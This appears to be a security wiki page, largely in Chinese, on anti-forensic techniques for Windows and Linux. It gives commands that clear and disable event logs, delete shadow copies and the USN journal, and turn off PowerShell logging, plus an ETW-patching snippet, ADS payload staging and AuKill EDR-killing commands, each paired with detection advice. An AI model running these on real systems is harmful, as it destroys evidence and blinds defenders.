# Anti-Forensic Techniques

{{#include ../../banners/hacktricks-training.md}}

## Timestamps

攻击者可能会感兴趣于**更改文件的时间戳**以避免被发现。\
可以在 MFT 的 `$STANDARD_INFORMATION` \_\_ 和 \_\_ `$FILE_NAME` 属性中找到时间戳。

两个属性都包含 4 个时间戳：**修改时间**、**访问时间**、**创建时间**和 **MFT 注册表修改时间**（MACE 或 MACB）。

**Windows explorer** 和其他工具会显示来自 **`$STANDARD_INFORMATION`** 的信息。

### TimeStomp - Anti-forensic Tool

此工具会**修改** **`$STANDARD_INFORMATION`** 中的时间戳信息，但**不会修改** **`$FILE_NAME`** 中的信息。因此，可以**识别**出**可疑**活动。

### Usnjrnl

**USN Journal**（Update Sequence Number Journal）是 NTFS（Windows NT file system）的一项功能，用于跟踪卷的更改。[**UsnJrnl2Csv**](https://github.com/jschicht/UsnJrnl2Csv) 工具可用于检查这些更改。

![TimeStomp - Anti-forensic Tool - Usnjrnl: USN Journal（Update Sequence Number Journal）是 NTFS（Windows NT file system）的一项功能，用于跟踪卷的更改。...](<../../images/image (801).png>)

上图是该**工具**显示的**输出**，可以观察到文件发生了**一些更改**。

### $LogFile

**文件系统中的所有元数据更改都会被记录**，这一过程称为 [write-ahead logging](https://en.wikipedia.org/wiki/Write-ahead_logging)。记录的元数据保存在名为 `**$LogFile**` 的文件中，该文件位于 NTFS 文件系统的根目录中。可以使用 [LogFileParser](https://github.com/jschicht/LogFileParser) 等工具解析此文件并识别更改。

![Usnjrnl - $LogFile: 文件系统中的所有元数据更改都会被记录，这一过程称为 write-ahead logging。记录的元数据保存在名为 $LogFile 的文件中，该文件位于 NTFS 文件系统的根目录中。...](<../../images/image (137).png>)

同样，在工具的输出中可以看到**发生了一些更改**。

使用同一工具，还可以识别时间戳被修改为**哪个时间**：

![Usnjrnl - $LogFile: 使用同一工具可以识别时间戳被修改为哪个时间](<../../images/image (1089).png>)

- CTIME：文件的创建时间
- ATIME：文件的修改时间
- MTIME：文件的 MFT 注册表修改时间
- RTIME：文件的访问时间

### `$STANDARD_INFORMATION` and `$FILE_NAME` comparison

识别可疑修改文件的另一种方法，是比较两个属性中的时间，查找**不匹配**。

### Nanoseconds

**NTFS** 时间戳的**精度**为 **100 纳秒**。因此，发现时间戳类似于 2010-10-10 10:10:**00.000:0000 的文件非常可疑**。

### SetMace - Anti-forensic Tool

此工具可以同时修改 `$STARNDAR_INFORMATION` 和 `$FILE_NAME` 两个属性。但是，从 Windows Vista 开始，必须由 live OS 修改此信息。

## Data Hiding

NFTS 使用簇以及最小信息大小。这意味着，如果一个文件占用一个半簇，**剩余的一半永远不会被使用**，直到文件被删除。因此，可以**在此 slack space 中隐藏数据**。

有一些工具（例如 slacker）可以将数据隐藏在这个“隐藏”空间中。但是，分析 `$logfile` 和 `$usnjrnl` 可以发现有数据被添加：

![SetMace - Anti-forensic Tool - Data Hiding: 有一些工具（例如 slacker）可以将数据隐藏在这个“隐藏”空间中。但是，分析 $logfile 和 $usnjrnl 可以发现有数据被添加：](<../../images/image (1060).png>)

然后，可以使用 FTK Imager 等工具恢复 slack space。请注意，此类工具可以将内容保存为混淆甚至加密的形式。

## UsbKill

这是一个在检测到 USB 端口发生任何变化时**关闭计算机**的工具。\
发现它的一种方法是检查正在运行的进程，并**检查每个正在运行的 python 脚本**。

## Live Linux Distributions

这些发行版在 **RAM** 内存中**运行**。检测它们的唯一方法是 **NTFS 文件系统以写入权限挂载**的情况。如果仅以读取权限挂载，则无法检测到入侵。

## Secure Deletion

[https://github.com/Claudio-C/awesome-data-sanitization](https://github.com/Claudio-C/awesome-data-sanitization)

## Windows Configuration

可以禁用多种 Windows logging 方法，从而使 forensic investigation 困难得多。

### Disable Timestamps - UserAssist

这是一个记录用户运行每个可执行文件的日期和时间的 registry key。

禁用 UserAssist 需要两步：

1. 将两个 registry key `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackProgs` 和 `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackEnabled` 都设置为零，以表示要禁用 UserAssist。
2. 清除类似于 `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\<hash>` 的 registry subtree。

### Disable Timestamps - Prefetch

这会保存有关所执行应用程序的信息，以提高 Windows 系统的性能。但是，这些信息也可用于 forensic practices。

- 执行 `regedit`
- 选择文件路径 `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\Memory Management\PrefetchParameters`
- 右键单击 `EnablePrefetcher` 和 `EnableSuperfetch`
- 对每一项选择 Modify，将值从 1（或 3）更改为 0
- 重启

### Disable Timestamps - Last Access Time

每当从 Windows NT server 的 NTFS 卷中打开文件夹时，系统都会记录时间，以**更新每个列出文件夹上的时间戳字段**，该字段称为 last access time。在使用频繁的 NTFS 卷上，这可能会影响性能。

1. 打开 Registry Editor（Regedit.exe）。
2. 转到 `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem`。
3. 查找 `NtfsDisableLastAccessUpdate`。如果不存在，则添加此 DWORD 并将其值设置为 1，这将禁用该过程。
4. 关闭 Registry Editor，然后重启 server。

### Delete USB History

所有 **USB Device Entries** 都存储在 Windows Registry 的 **USBSTOR** registry key 下，其中包含在将 USB Device 插入 PC 或 Laptop 时创建的子 key。可以在此处找到该 key：`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`。**删除该 key** 将删除 USB history。\
还可以使用 [**USBDeview**](https://www.nirsoft.net/utils/usb_devices_view.html) 工具，以确保已删除这些条目（并删除它们）。

另一个保存 USB 信息的文件是 `C:\Windows\INF` 中的 `setupapi.dev.log` 文件。该文件也应被删除。

### Disable Shadow Copies

使用 `vssadmin list shadowstorage` **列出** shadow copies\
运行 `vssadmin delete shadow` **删除**它们

也可以按照 [https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html](https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html) 中的步骤通过 GUI 删除它们。

要禁用 shadow copies，请参阅[此处的步骤](https://support.waters.com/KB_Inf/Other/WKB15560_How_to_disable_Volume_Shadow_Copy_Service_VSS_in_Windows)：

1. 单击 Windows start button 后，在文本搜索框中输入“services”，打开 Services program。
2. 在列表中找到“Volume Shadow Copy”，选中它，然后右键单击并进入 Properties。
3. 在“Startup type”下拉菜单中选择 Disabled，然后单击 Apply 和 OK 确认更改。

还可以在 registry `HKLM\SYSTEM\CurrentControlSet\Control\BackupRestore\FilesNotToSnapshot` 中修改 shadow copy 要复制的文件配置。

### Overwrite deleted files

- 可以使用 **Windows tool**：`cipher /w:C`。这会指示 cipher 删除 C drive 可用未使用磁盘空间中的所有数据。
- 也可以使用 [**Eraser**](https://eraser.heidi.ie) 等工具。

### Delete Windows event logs

- Windows + R --> eventvwr.msc --> 展开“Windows Logs”--> 右键单击每个类别并选择“Clear Log”
- `for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"`
- `Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }`

### Disable Windows event logs

- `reg add 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\eventlog' /v Start /t REG_DWORD /d 4 /f`
- 在 services 部分禁用“Windows Event Log”服务
- `WEvtUtil.exec clear-log` 或 `WEvtUtil.exe cl`

### Disable $UsnJrnl

- `fsutil usn deletejournal /d c:`

---

## Advanced Logging & Trace Tampering (2023-2025)

### PowerShell ScriptBlock/Module Logging

Windows 10/11 和 Windows Server 的近期版本会在
`Microsoft-Windows-PowerShell/Operational`（事件 4104/4105/4106）下保存**丰富的 PowerShell forensic artifacts**。
攻击者可以即时禁用或清除这些记录：
```powershell
# Turn OFF ScriptBlock & Module logging (registry persistence)
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowerShellEngine" \
-Name EnableScriptBlockLogging -Value 0 -PropertyType DWord -Force
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging" \
-Name EnableModuleLogging -Value 0 -PropertyType DWord -Force

# In-memory wipe of recent PowerShell logs
Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' |
Remove-WinEvent               # requires admin & Win11 23H2+
```
防御者应监控这些注册表键的变化，以及大量删除 PowerShell 事件的行为。

### ETW (Event Tracing for Windows) Patch

Endpoint security 产品高度依赖 ETW。一种流行于 2024 年的规避方法是在内存中 patch
`ntdll!EtwEventWrite`/`EtwEventWriteFull`，使每次 ETW 调用都返回 `STATUS_SUCCESS`
而不发出事件：
```c
// 0xC3 = RET on x64
unsigned char patch[1] = { 0xC3 };
WriteProcessMemory(GetCurrentProcess(),
GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite"),
patch, sizeof(patch), NULL);
```
Public PoCs（例如 `EtwTiSwallow`）使用 PowerShell 或 C++ 实现相同的 primitive。
由于该 patch 是 **process-local** 的，运行在其他进程中的 EDR 可能会漏检。
检测方式：比较内存中的 `ntdll` 与磁盘上的版本，或在 user-mode 之前进行 hook。

### Alternate Data Streams (ADS) Revival

2023 年的 Malware campaigns（例如 **FIN12** loaders）被发现将 second-stage binaries
暂存于 ADS 中，以避开传统 scanners：
```cmd
rem Hide cobalt.bin inside an ADS of a PDF
type cobalt.bin > report.pdf:win32res.dll
rem Execute directly
wmic process call create "cmd /c report.pdf:win32res.dll"
```
使用 `dir /R`、`Get-Item -Stream *` 或 Sysinternals `streams64.exe` 枚举 streams。  
将主机文件复制到 FAT/exFAT，或通过 SMB 复制，会剥离隐藏 stream，调查人员可利用这一点恢复 payload。

### BYOVD & “AuKill” (2023)

Bring-Your-Own-Vulnerable-Driver 目前已被常规用于勒索软件入侵中的 **anti-forensics**。  
开源工具 **AuKill** 加载已签名但存在漏洞的驱动程序（`procexp152.sys`），在加密和销毁日志**之前**暂停或终止 EDR 及 forensic sensors：<sup>[[1]](#references)</sup>
```cmd
AuKill.exe -e "C:\\Program Files\\Windows Defender\\MsMpEng.exe"
AuKill.exe -k CrowdStrike
```
随后移除该 driver，仅留下极少的 artifacts。<sup>[[1]](#references)</sup>
缓解措施：启用 Microsoft vulnerable-driver blocklist（HVCI/SAC），
并针对从 user-writable paths 创建 kernel-service 发出告警。

---

## Linux Anti-Forensics：Self-Patching 和 Cloud C2（2023–2025）

### Self‑patching compromised services to reduce detection（Linux）
攻击者越来越多地在成功利用服务后立即进行“self‑patch”，以同时防止再次利用并抑制基于漏洞的检测。其思路是使用最新的合法上游 binaries/JARs 替换存在漏洞的 components，使 scanners 报告主机已完成 patch，同时 persistence 和 C2 仍然存在。<sup>[[3]](#references)</sup>

示例：Apache ActiveMQ OpenWire RCE（CVE‑2023‑46604）<sup>[[3]](#references)[[4]](#references)</sup>
- 在 post‑exploitation 阶段，攻击者从 Maven Central（repo1.maven.org）获取合法 JARs，删除 ActiveMQ install 中存在漏洞的 JARs，然后重启 broker。
- 这关闭了初始 RCE，同时保留了其他 footholds（cron、SSH config 更改、独立的 C2 implants）。

操作示例（说明性）
```bash
# ActiveMQ install root (adjust as needed)
AMQ_DIR=/opt/activemq
cd "$AMQ_DIR"/lib

# Fetch patched JARs from Maven Central (versions as appropriate)
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-client/5.18.3/activemq-client-5.18.3.jar
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-openwire-legacy/5.18.3/activemq-openwire-legacy-5.18.3.jar

# Remove vulnerable files and ensure the service uses the patched ones
rm -f activemq-client-5.18.2.jar activemq-openwire-legacy-5.18.2.jar || true
ln -sf activemq-client-5.18.3.jar activemq-client.jar
ln -sf activemq-openwire-legacy-5.18.3.jar activemq-openwire-legacy.jar

# Apply changes without removing persistence
systemctl restart activemq || service activemq restart
```
法证/hunting 技巧
- 检查服务目录中是否存在未计划的 binary/JAR 替换：
- Debian/Ubuntu：`dpkg -V activemq`，并将文件 hashes/paths 与 repo mirrors 进行比较。
- RHEL/CentOS：`rpm -Va 'activemq*'`
- 查找磁盘上存在但不归 package manager 所有的 JAR 版本，或在带外更新的 symbolic links。
- Timeline：`find "$AMQ_DIR" -type f -printf '%TY-%Tm-%Td %TH:%TM %p\n' | sort`，将 ctime/mtime 与 compromise window 进行关联。
- Shell history/process telemetry：初始 exploitation 后立即出现向 `repo1.maven.org` 或其他 artifact CDN 执行 `curl`/`wget` 的证据。
- Change management：验证是谁以及为何应用了该“patch”，而不仅仅是确认存在 patched version。

### 使用 bearer tokens 和 anti-analysis stagers 的 Cloud-service C2
Observed tradecraft combined multiple long-haul C2 paths and anti-analysis packaging:<sup>[[3]](#references)</sup>
- 使用 password-protected PyInstaller ELF loaders 来阻碍 sandboxing 和 static analysis（例如 encrypted PYZ、在 `/_MEI*` 下进行 temporary extraction）。
- Indicators：`strings` 命中 `PyInstaller`、`pyi-archive`、`PYZ-00.pyz`、`MEIPASS` 等字符串。
- Runtime artifacts：提取到 `/tmp/_MEI*` 或自定义的 `--runtime-tmpdir` paths。
- 基于 Dropbox 的 C2，使用 hardcoded OAuth Bearer tokens
- Network markers：`api.dropboxapi.com` / `content.dropboxapi.com`，以及包含 `Authorization: Bearer <token>` 的请求。
- 在 proxy/NetFlow/Zeek/Suricata 中 hunting：查找通常不会同步文件的 server workloads 向 Dropbox domains 发起的 outbound HTTPS。
- 通过 tunneling 实现 parallel/backup C2（例如 Cloudflare Tunnel `cloudflared`），在一个 channel 被阻断时保持 control。
- Host IOCs：`cloudflared` processes/units、位于 `~/.cloudflared/*.json` 的 config，以及向 Cloudflare edges 发起的 outbound 443。

### 维持 access 的 Persistence 和“hardening rollback”（Linux examples）
Attackers frequently pair self-patching with durable access paths:<sup>[[3]](#references)</sup>
- Cron/Anacron：编辑每个 `/etc/cron.*/` directory 中的 `0anacron` stub，以执行 periodic execution。
- Hunt：
```bash
for d in /etc/cron.*; do [ -f "$d/0anacron" ] && stat -c '%n %y %s' "$d/0anacron"; done
grep -R --line-number -E 'curl|wget|python|/bin/sh' /etc/cron.*/* 2>/dev/null
```
- SSH configuration hardening rollback：启用 root logins，并修改 low-privileged accounts 的 default shells。
- Hunt for root login enablement：
```bash
grep -E '^\s*PermitRootLogin' /etc/ssh/sshd_config
# flag values like "yes" or overly permissive settings
```
- Hunt for suspicious interactive shells on system accounts（例如 `games`）：
```bash
awk -F: '($7 ~ /bin\/(sh|bash|zsh)/ && $1 ~ /^(games|lp|sync|shutdown|halt|mail|operator)$/) {print}' /etc/passwd
```
- 随机的短名称 beacon artifacts（8 个 alphabetical chars）被 dropped to disk，同时还会 contact cloud C2：
- Hunt：
```bash
find / -maxdepth 3 -type f -regextype posix-extended -regex '.*/[A-Za-z]{8}$' \
-exec stat -c '%n %s %y' {} \; 2>/dev/null | sort
```

Defenders 应将这些 artifacts 与 external exposure 及 service patching events 进行关联，以发现用于隐藏 initial exploitation 的 anti-forensic self-remediation。

## References

- [1] [Sophos X-Ops – AuKill: A Weaponized Vulnerable Driver for Disabling EDR (March 2023)](https://news.sophos.com/en-us/2023/03/07/aukill-a-weaponized-vulnerable-driver-for-disabling-edr)
- [2] [Red Canary – Patching EtwEventWrite for Stealth: Detection & Hunting (June 2024)](https://redcanary.com/blog/etw-patching-detection)
- [3] [Red Canary – Patching for persistence: How DripDropper Linux malware moves through the cloud](https://redcanary.com/blog/threat-intelligence/dripdropper-linux-malware/)
- [4] [CVE‑2023‑46604 – Apache ActiveMQ OpenWire RCE (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)

{{#include ../../banners/hacktricks-training.md}}
